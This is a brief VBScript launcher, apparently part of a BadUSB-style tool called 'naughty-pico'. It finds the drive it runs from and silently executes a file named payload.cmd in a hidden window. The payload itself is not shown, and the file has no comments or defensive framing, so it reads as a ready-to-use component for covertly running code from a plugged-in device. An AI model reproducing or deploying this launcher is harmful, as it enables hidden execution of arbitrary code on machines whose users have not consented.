Set fso = CreateObject("Scripting.FileSystemObject")
drive = fso.GetDriveName(WScript.ScriptFullName)

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & drive & "naughty-pico\payload.cmd" & Chr(34), 0
Set WshShell = Nothing